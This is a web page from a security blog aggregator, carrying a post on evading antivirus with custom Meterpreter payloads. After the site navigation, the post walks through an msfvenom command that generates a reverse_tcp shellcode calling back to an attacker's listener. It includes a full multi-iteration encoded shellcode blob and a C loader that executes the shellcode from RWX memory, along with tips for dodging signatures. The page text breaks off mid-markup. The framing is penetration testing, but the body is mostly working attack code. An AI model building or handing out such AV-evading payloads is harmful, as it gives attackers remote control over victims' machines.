+		<li><a href="https://twitter.com/securityblvd" target="_blank"><i class="fa fa-twitter"></i></a></li><li><a href="https://www.linkedin.com/groups/64292" target="_blank"><i class="fa fa-linkedin"></i></a></li><li><a href="https://www.facebook.com/groups/24445075146/" target="_blank"><i class="fa fa-facebook"></i></a></li><li><a href="https://www.youtube.com/channel/UC1a8XaAVjQSn_SgIW-rdq0A" target="_blank"><i class="fa fa-youtube"></i></a></li><li><a href="https://soundcloud.com/user-540767378" target="_blank"><i class="fa fa-soundcloud"></i></a></li>		<li><a href="https://securityboulevard.com/feed/" ><i class="fa fa-rss"></i></a></li><li><a href="https://news.google.com/publications/CAAqMggKIixDQklTR3dnTWFoY0tGWE5sWTNWeWFYUjVZbTkxYkdWMllYSmtMbU52YlNnQVAB?hl=en-US&#038;gl=US&#038;ceid=US%3Aen" ><i class="fa fa-google"></i></a></li>		</ul>
+	</div><!-- .social-links -->
+						</div>
+				</div>
+			
+			
+			<div class="inner-wrap">
+
+				<div id="header-text-nav-wrap" class="clearfix">
+					<div id="header-left-section">
+													<div id="header-logo-image"><!--LIVE-->
+																	<!--<a href="https://securityboulevard.com/" title="Security Boulevard" rel="home"><img src="" alt="Security Boulevard">--><a href="https://securityboulevard.com/" title="Security Boulevard" rel="home"><h2 style="color:#fff;padding-bottom:0;padding-top:18px;"><img src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2017/09/sbn_color.png"></h2></a>
+								
+															</div>
+							<!-- #header-logo-image -->
+												<div id="header-text" class="screen-reader-text">
+															<h3 id="site-title">
+									<a href="https://securityboulevard.com/" title="Security Boulevard" rel="home">Security Boulevard</a>
+								</h3>
+																						<p id="site-description">The Home of the Security Bloggers Network</p>
+							<!-- #site-description -->
+						</div><!-- #header-text -->
+						<div style="clear:both;"></div>
+						<nav>
+						<div id="mega-menu-wrap-secondary" class="mega-menu-wrap"><div class="mega-menu-toggle"><div class="mega-toggle-blocks-left"><div class='mega-toggle-block mega-menu-toggle-block mega-toggle-block-1' id='mega-toggle-block-1' tabindex='0'><span class='mega-toggle-label' role='button' aria-expanded='false'><span class='mega-toggle-label-closed'>Community   Chats   Webinars   Library</span><span class='mega-toggle-label-open'></span></span></div></div><div class="mega-toggle-blocks-center"></div><div class="mega-toggle-blocks-right"></div></div><ul id="mega-menu-secondary" class="mega-menu max-mega-menu mega-menu-horizontal mega-no-js" data-event="hover_intent" data-effect="fade_up" data-effect-speed="200" data-effect-mobile="disabled" data-effect-speed-mobile="0" data-mobile-force-width="false" data-second-click="close" data-document-click="collapse" data-vertical-behaviour="standard" data-breakpoint="100" data-unbind="true" data-hover-intent-timeout="300" data-hover-intent-interval="100"><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-home mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-1770759' id='mega-menu-item-1770759'><a class="mega-menu-link" href="https://securityboulevard.com" aria-haspopup="true" aria-expanded="false" tabindex="0">Home<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1770766' id='mega-menu-item-1770766'><a class="mega-menu-link" href="https://securityboulevard.com/cybersecurity-news/">Cybersecurity News</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1770767' id='mega-menu-item-1770767'><a class="mega-menu-link" href="https://securityboulevard.com/features/">Features</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1770768' id='mega-menu-item-1770768'><a class="mega-menu-link" href="https://securityboulevard.com/industry-spotlight/">Industry Spotlight</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-1806483' id='mega-menu-item-1806483'><a class="mega-menu-link" href="https://securityboulevard.com/news-releases/">News Releases</a></li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-1778278' id='mega-menu-item-1778278'><a class="mega-menu-link" href="https://securityboulevard.com/security-bloggers-network/" aria-haspopup="true" aria-expanded="false" tabindex="0">Security Bloggers Network<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1770756' id='mega-menu-item-1770756'><a class="mega-menu-link" href="https://securityboulevard.com/security-bloggers-network/">Latest Posts</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1770296' id='mega-menu-item-1770296'><a class="mega-menu-link" href="https://securityboulevard.com/boulevard-authors/?search=&#038;activity=1d&#038;submit=Search">Contributors</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1770819' id='mega-menu-item-1770819'><a class="mega-menu-link" href="https://securityboulevard.com/boulevard-feed-request/">Syndicate Your Blog</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1770820' id='mega-menu-item-1770820'><a class="mega-menu-link" href="https://securityboulevard.com/write-for-security-boulevard/">Write for Security Boulevard</a></li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-1758216' id='mega-menu-item-1758216'><a class="mega-menu-link" href="https://securityboulevard.com/webinars/" aria-haspopup="true" aria-expanded="false" tabindex="0">Webinars<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1772145' id='mega-menu-item-1772145'><a class="mega-menu-link" href="https://securityboulevard.com/webinars/">Upcoming</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1772144' id='mega-menu-item-1772144'><a class="mega-menu-link" href="https://securityboulevard.com/on-demand-webinars/">On-Demand</a></li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-1594460' id='mega-menu-item-1594460'><a class="mega-menu-link" href="https://securityboulevard.com/chats/" aria-haspopup="true" aria-expanded="false" tabindex="0">Chat<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1810928' id='mega-menu-item-1810928'><a class="mega-menu-link" href="https://securityboulevard.com/chats/">Security Boulevard Chat</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1810941' id='mega-menu-item-1810941'><a class="mega-menu-link" href="https://securityboulevard.com/marketing-insecurity-podcasts/">Marketing InSecurity Podcast</a></li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-align-bottom-left mega-menu-flyout mega-menu-item-1594390' id='mega-menu-item-1594390'><a class="mega-menu-link" href="https://securityboulevard.com/library/" tabindex="0">Library</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-hide-sub-menu-on-mobile mega-menu-item-1836261' id='mega-menu-item-1836261'><a class="mega-menu-link" href="#" aria-haspopup="true" aria-expanded="false" tabindex="0">Related Sites<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1836259' id='mega-menu-item-1836259'><a target="_blank" class="mega-menu-link" href="https://mediaops.io/">MediaOps Inc.</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1836262' id='mega-menu-item-1836262'><a target="_blank" class="mega-menu-link" href="https://devops.com">DevOps.com</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1836260' id='mega-menu-item-1836260'><a target="_blank" class="mega-menu-link" href="https://containerjournal.com/">Container Journal</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1836264' id='mega-menu-item-1836264'><a target="_blank" class="mega-menu-link" href="https://digitalanarchist.com">Digital Anarchist</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-1836263' id='mega-menu-item-1836263'><a target="_blank" class="mega-menu-link" href="https://sweetcode.io/">SweetCode.io</a></li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-align-bottom-left mega-menu-flyout mega-hide-sub-menu-on-mobile mega-menu-item-1836265' id='mega-menu-item-1836265'><a target="_blank" class="mega-menu-link" href="https://mediaops.io/wp-content/uploads/2020/02/MediaOpsOverview2020-1.pdf" tabindex="0">Media Kit</a></li></ul></div>						</nav>
+					</div><!-- #header-left-section -->
+					<div id="header-right-section">
+												<div id="header-right-sidebar" class="clearfix">
+						<aside id="custom_html-9" class="widget_text widget widget_custom_html clearfix"><div class="textwidget custom-html-widget"><!-- /80877830/SB_Leaderboard -->
+<div id='div-gpt-ad-1503669457440-0' style='text-align: center;'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1503669457440-0'); });
+</script>
+</div></div></aside>						</div>
+											</div><!-- #header-right-section -->
+
+
+				</div><!-- #header-text-nav-wrap -->
+
+			</div><!-- .inner-wrap -->
+			
+			
+							<nav id="site-navigation" class="main-navigation clearfix" role="navigation">
+					<div class="inner-wrap clearfix">
+												<h4 class="menu-toggle"></h4>
+						<div class="menu-primary-container"><ul id="menu-sbn" class="menu"><li id="menu-item-1354905" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354905"><a href="https://securityboulevard.com/security-analytics/">Analytics</a></li>
+<li id="menu-item-1354898" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354898"><a href="https://securityboulevard.com/application-security/">AppSec</a></li>
+<li id="menu-item-1354901" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354901"><a href="https://securityboulevard.com/ciso-suite">CISO</a></li>
+<li id="menu-item-1354899" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354899"><a href="https://securityboulevard.com/cloud-security/">Cloud</a></li>
+<li id="menu-item-1354900" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354900"><a href="https://securityboulevard.com/devops/">DevOps</a></li>
+<li id="menu-item-1585472" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1585472"><a href="https://securityboulevard.com/governance-risk-compliance">GRC</a></li>
+<li id="menu-item-1709334" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1709334"><a href="https://securityboulevard.com/identity-management">Identity</a></li>
+<li id="menu-item-1354903" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354903"><a href="https://securityboulevard.com/incident-response/">Incident Response</a></li>
+<li id="menu-item-1354902" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354902"><a href="https://securityboulevard.com/iot-ics-security/">IoT / ICS</a></li>
+<li id="menu-item-1354904" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1354904"><a href="https://securityboulevard.com/threats-breaches/">Threats / Breaches</a></li>
+<li id="menu-item-1585471" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-has-children menu-item-1585471"><a href="https://securityboulevard.com">More</a>
+<ul class="sub-menu">
+	<li id="menu-item-1759535" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1759535"><a href="https://securityboulevard.com/blockchain-digital-currency-bitcoin/">Blockchain / Digital Currencies</a></li>
+	<li id="menu-item-1585476" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1585476"><a href="https://securityboulevard.com/careers">Careers</a></li>
+	<li id="menu-item-1585475" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1585475"><a href="https://securityboulevard.com/cyberlaw">Cyberlaw</a></li>
+	<li id="menu-item-1585473" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1585473"><a href="https://securityboulevard.com/mobile-security">Mobile</a></li>
+	<li id="menu-item-1585474" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1585474"><a href="https://securityboulevard.com/social-engineering">Social Engineering</a></li>
+</ul>
+</li>
+<li id="menu-item-1799594" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1799594"><a href="https://securityboulevard.com/humor">Humor</a></li>
+</ul></div>																			<i class="fa fa-search search-top"></i>
+							<div class="search-form-top">
+								<form action="https://securityboulevard.com/" class="search-form searchform clearfix" method="get">
+	<div class="search-wrap">
+		<input type="text" placeholder="Search" class="s field" name="s">
+		<button class="search-icon" type="submit"></button>
+	</div>
+</form><!-- .searchform -->
+							</div>
+											</div>
+				</nav>
+			
+		</div><!-- #header-text-nav-container -->
+
+		
+	</header>
+			<div id="main" class="clearfix">
+		
+		
+		<div class="inner-wrap clearfix">
+
+	
+	<div id="primary">
+		<div id="content" class="clearfix">
+
+			
+				
+
+
+<article id="post-1839370" class="post-1839370 post type-post status-publish format-standard hentry category-sbn tag-network">
+		
+	<div class="a2a_kit a2a_kit_size_32 a2a_floating_style a2a_vertical_style" style="margin-left:-100px; top:300px;background-color:transparent;"><a class="a2a_button_twitter" href="https://www.addtoany.com/add_to/twitter?linkurl=https%3A%2F%2Fsecurityboulevard.com%2F2020%2F02%2Fevading-antivirus-with-better-meterpreter-payloads%2F&amp;linkname=Evading%20Antivirus%20with%20Better%20Meterpreter%20Payloads%20-%20Security%20Boulevard" title="Twitter" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_linkedin" href="https://www.addtoany.com/add_to/linkedin?linkurl=https%3A%2F%2Fsecurityboulevard.com%2F2020%2F02%2Fevading-antivirus-with-better-meterpreter-payloads%2F&amp;linkname=Evading%20Antivirus%20with%20Better%20Meterpreter%20Payloads%20-%20Security%20Boulevard" title="LinkedIn" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_facebook" href="https://www.addtoany.com/add_to/facebook?linkurl=https%3A%2F%2Fsecurityboulevard.com%2F2020%2F02%2Fevading-antivirus-with-better-meterpreter-payloads%2F&amp;linkname=Evading%20Antivirus%20with%20Better%20Meterpreter%20Payloads%20-%20Security%20Boulevard" title="Facebook" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_reddit" href="https://www.addtoany.com/add_to/reddit?linkurl=https%3A%2F%2Fsecurityboulevard.com%2F2020%2F02%2Fevading-antivirus-with-better-meterpreter-payloads%2F&amp;linkname=Evading%20Antivirus%20with%20Better%20Meterpreter%20Payloads%20-%20Security%20Boulevard" title="Reddit" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_email" href="https://www.addtoany.com/add_to/email?linkurl=https%3A%2F%2Fsecurityboulevard.com%2F2020%2F02%2Fevading-antivirus-with-better-meterpreter-payloads%2F&amp;linkname=Evading%20Antivirus%20with%20Better%20Meterpreter%20Payloads%20-%20Security%20Boulevard" title="Email" rel="nofollow noopener" target="_blank"></a><a class="a2a_dd addtoany_share_save addtoany_share" href="https://www.addtoany.com/share"></a></div>
+	
+	
+	<div class="article-content clearfix">
+
+		
+		<div class="above-entry-meta"><span class="cat-links"><a href="https://securityboulevard.com/category/sbn/"  rel="category tag">Security Bloggers Network</a>&nbsp;</span></div>
+		<header class="entry-header">
+			<h1 class="entry-title">
+				
+				
+					<p id="breadcrumbs"><span><span><a href="https://securityboulevard.com/">Home</a> » <span><a href="https://securityboulevard.com/category/sbn/">Security Bloggers Network</a> » <span class="breadcrumb_last" aria-current="page">Evading Antivirus with Better Meterpreter Payloads</span></span></span></span></p>
+									
+				<img style='position:relative;top:4px;left:0px;bottom:2px;width: 35px;' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2017/09/SBNIcon4_512px.png'>				Evading Antivirus with Better Meterpreter Payloads
+			</h1>
+		</header>
+
+				
+				<div class="below-entry-meta">
+		<img alt='' src='https://secure.gravatar.com/avatar/155e993193d31a6c290e07bd75cc1f8d?s=32&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/155e993193d31a6c290e07bd75cc1f8d?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>		<span class="sbyline"><span class="author vcard"> <a class="url fn n" href="https://securityboulevard.com/author/elliott/"><span class='jcolor'>by</span> Elliott <span class='jcolor'>on</span>  February 6, 2020</a></span></span>
+		</div>
+		
+		
+
+
+		<div class="entry-content clearfix">
+			<div class="feedwordpress-gaffer-full-text"><p>Evading antivirus is often an under appreciated art that can make or break a penetration test. Modern antivirus products can detect meterpreter payloads easily, and can leave a pentester falsely believing a system is not exploitable.</p><p>To increase our overall success rate of exploitation we will create a custom meterpreter reverse_tcp payload.</p><p>To do this we will first need a few things:</p><p>Visual Studio 2019 Community (Free): <a href="https://visualstudio.microsoft.com/downloads/">https://visualstudio.microsoft.com/downloads/</a> Metasploit Framework: <a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p><h3>TLDR</h3><p>We will create shellcode with msfvenom, encode it, paste it to a custom template, and deliver the compiled binary as a custom payload with metasploit.</p><h3>Windows Shellcode: x86 or x64?</h3><p>Several years ago it was very common for x64 binaries to fly by Windows Defender, however AV products have greatly improved recently and begun to detect x64 meterpreter payloads we tested. Very few encoders support x64 shellcode which further reduces our ability to create stealthy payloads. In our testing we find that building x86 payloads with the shikata_ga_nai have stood the longest test of time and are still able to evade most AV engines.</p><h3>Meterpreter payloads: which one?</h3><p>You can view a list of payloads by running <code>msfvenom -l payloads</code>, we will use the reverse_tpc staged payload:</p><pre><code>windows/meterpreter/reverse_tcp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker</code></pre><p>Note: our selected payload <code>windows/meterpreter/reverse_tcp</code> payload is considerably different than the <code>windows/meterpreter_reverse_tcp</code> payload. The second <code>/</code> indicates the payload is staged and will connect back to our handler to deliver the complete meterpreter payload.</p><h3>Shellcode Encoder</h3><p>You can view all available encoders by running <code>msfvenom -l encoders</code>. We see the most success using <code>x86/shikata_ga_nai</code> with a number of iterations.</p><pre><code>    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</code></pre><h3>Creating the shellcode with Msfvenom</h3><p>Now we will use msfvenom to export the reverse_tcp payload as encoded shellcode. You will need to change the IP and port to that of your listener. You may also wish to change the number of iterations (<code>-i 8</code>), using up to 25 should be safe in most situations:</p><pre><code>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=9090 -e x86/shikata_ga_nai -i 8 -f c &gt; shell.c</code></pre><p>In the output of this we’re interested in <code>Payload size:</code> line, in this example we have 557 bytes</p><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 8 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 (iteration=0)x86/shikata_ga_nai succeeded with size 395 (iteration=1)x86/shikata_ga_nai succeeded with size 422 (iteration=2)x86/shikata_ga_nai succeeded with size 449 (iteration=3)x86/shikata_ga_nai succeeded with size 476 (iteration=4)x86/shikata_ga_nai succeeded with size 503 (iteration=5)x86/shikata_ga_nai succeeded with size 530 (iteration=6)x86/shikata_ga_nai succeeded with size 557 (iteration=7)x86/shikata_ga_nai chosen with final size 557Payload size: 557 bytesFinal size of c file: 2366 bytes</code></pre><p>In our <code>shell.c</code> output we have the following shellcode:</p><pre><code>unsigned char buf[] ="xdbxddxd9x74x24xf4x5ax31xc9xbbx3bxe2xb0xc9xb1""x85x31x5ax19x03x5ax19x83xeaxfcxd9x17x0dxc1xab""x37x0ax09x07x1exa7x89x53xfbx61x1bx2ax82x40xf1""x59xf8x61x01x62x94x74xe8x99x05x5bx51xe8x63xe4""x2ax87xccxeaxfbx81x45x6bx9axbdx83x08x50xdex32""x65x18x9cx35x5bx77x9ax64xeax8fxfax13x1fx28xe1""xb9xfdxe2x22xbax07xd5xe0x74xeaxb8x9cx81x28x24""x11x81x75x4cxcax2bx53x3fx7exa4x88xf8xaax76x43""x4dxecx6dxcaxf9xd8x3fxf6x11xdex11xc3x16x02xa5""x04x32x29x21xc9x4exdfxa8xcfxdcxd7x81x91xcex08""x3bxf8x72xc1xcax3cx89xeexcdx89xabxa2xcfx82x5d""xdfx24xc9xdbx19x83xa6x73xffxa9xe4xcex23x0exf2""x5ax1bx49x6fx5cx32xa1x17xc6x6ax83xfbxb1x61x3c""x63x1fx31xa8x1ex53x68x3axe0xe5x17xb6x02x37x3e""xa2xbbxb0xe1xb8x54x73xf2x17xc6xadxe2x0dxb0x84""x56x54x82x23x79x1fx4exeex94x8fx3axe1x10x06x45""xf9xb9x8ax65xfdx02xc9x07xcexb4x61x92x74xdfx14""x47x19x51xe4x9dxd8xa8x13xbfx50x5bxf9x1ex2dx48""x8ex2fx12x43x44x1fx9axe1x53xffx0bx33xd8x66xbc""xf2xfcxc9x51xbdx2ax19xe9xd5xbcx9ex5fx72xcfx8a""x81x42x1cxd8x0ex8cxedx75xfex7ax5dx72xffx81x09""xa4x1bx91x74x31x32xc5xd3x7bxd0xd3x58x2ax61xc0""xddx2axdcxe5x84x8dx75x99xf8x66xccx72xdcx55x98""x40xcfxc3xcfxdbx02x61x0cxd9xa4xf0x20xcfxdbx3f""x1cx54x05x4dxe6xf1x3axd2x5bx0cx4bx52x6ex0cxfe""xeex89x4ex4cx17x55xc7x42x3exfdx8axafxdfxe5x69""xc9x10x48xc6xabx85x41x23x4axbexc4x85x27x5ex74""xa8xc3x9bx3fx24xccx4ex0fxe0x54x26x0ax95x12x97""x61x8dxa8x90x95x1dx40x29x0cx9axf8xcfx35x2fx64""x27xc4x75x2ex13x7ax12x7cx46x83xd6xcfx18x41x1e""x03x74xb6xc7x90x7ex22x72xfcx59x67x84xb5xe6x3e""x47xcdxbbxa2xabxa3xb4xfexc2x6fx38x49xf9xecx59""x81x15x7bx10xc0x3bx05xe1x5cxacx08x85x2fx3fx90""x29x2excdxaax4ex6fx9fx9cxe9x97x96x3fxb0xd4xc1""x64x22x20xe5xdcx5ax0fx7fx77x37xd1x51x77xa4x10""xedx58xd0xbbx62xa9x8fx30x8exa1x1dx0dx73x3dx3f""xcbxf4xfex06x81xc6xf2x03xc7x22xf0xebx0ex61xe6""x5cxc5";</code></pre><h3>Create a Visual Studio Project</h3><p>Open Visual Studio and press “Create a new project”:</p><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project.png" alt="" width="640" height="363" class="aligncenter size-full wp-image-354" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project.png 992w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project-800x454.png 800w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project-768x436.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project-200x114.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project-600x341.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><p>Select “Empty project”:</p><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-empty-proect.png" alt="" width="640" height="205" class="aligncenter size-full wp-image-355" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-empty-proect.png 1017w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-empty-proect-800x256.png 800w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-empty-proect-768x246.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-empty-proect-200x64.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-empty-proect-600x192.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><p>Choose a project name and press “Create”:</p><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/create-project.png" alt="" width="640" height="418" class="aligncenter size-full wp-image-356" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/create-project.png 1022w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/create-project-800x523.png 800w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/create-project-768x502.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/create-project-200x131.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/create-project-600x392.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><p>In “Source Files”, right click to add a “New item”:</p><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-new-item.png" alt="" width="640" height="319" class="aligncenter size-full wp-image-357" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-new-item.png 986w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-new-item-800x399.png 800w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-new-item-768x383.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-new-item-200x100.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-new-item-600x299.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><p>Select cpp file and name this “main.cpp”:</p><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-main.png" alt="" width="640" height="444" class="aligncenter size-full wp-image-358" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-main.png 941w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-main-800x555.png 800w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-main-768x533.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-main-200x139.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-main-600x416.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><h3>Create a custom template</h3><p>In your main.cpp file we will paste the following code:</p><pre><code>#include &lt;stdio.h&gt;#include &lt;windows.h&gt;unsigned const char payload[] = "";size_t size = 0;int main(int argc, char** argv) {    char* code;    printf("This is just a random string!n");    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);    memcpy(code, payload, size);     ((void(*)())code)();    return(0);}</code></pre><p>We just need to change two things:</p><p>1: Add the “Payload size” number (do not use the “Final size of c file”) from when we generated the payload. In this case it was 557 bytes:</p><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/payload-size.png" alt="" width="640" height="114" class="aligncenter size-full wp-image-360" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/payload-size.png 698w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/payload-size-200x36.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/payload-size-600x107.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><ol><li>Replace the placeholder in payload[] with the shellcode generated in buf[]:</li></ol><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/shellcode.png" alt="" width="640" height="173" class="aligncenter size-full wp-image-361" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/shellcode.png 652w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/shellcode-200x54.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/shellcode-600x162.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><ol><li>Add some random text so we don’t all use the same signatures!</li></ol><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/random-string.png" alt="" width="640" height="107" class="aligncenter size-full wp-image-362" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/random-string.png 785w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/random-string-768x128.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/random-string-200x33.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/random-string-600x100.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><ol><li>In the build dropdown select release:</li></ol><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-release.png" alt="" width="640" height="132" class="aligncenter size-full wp-image-359" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-release.png 783w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-release-768x159.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-release-200x41.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-release-600x124.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><ol><li>Hit Ctrl+B and your payload should be built!</li></ol><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/project-executable.png" alt="" width="640" height="90" class="aligncenter size-full wp-image-363" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/project-executable.png 722w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/project-executable-200x28.png 200w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/project-executable-600x85.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><p>Note: If you encounter errors regarding vcruntime140.dll the system may not have the Visual Studio Runtime installed; you may encounter this on minimally built server. To avoid this you can go to Project Properties and change the runtime library to <code>Multi-threaded (/MT)</code> which will create a statically linked binary. This however will be a larger binary and far more prone to detection by AV. Use this only as a last resort!</p><p><img loading="lazy" src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/static-linked-payload.png" alt="" width="640" height="213" class="aligncenter size-full wp-image-364" srcset="https://www.virtuesecurity.com/wp-content/uploads/2020/02/static-linked-payload.png 781w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/static-linked-payload-768x256.png 768w, https://www.virtuesecurity.com/wp-content/uploads/2020/02/static-linked-payload-200x67.png 200w, 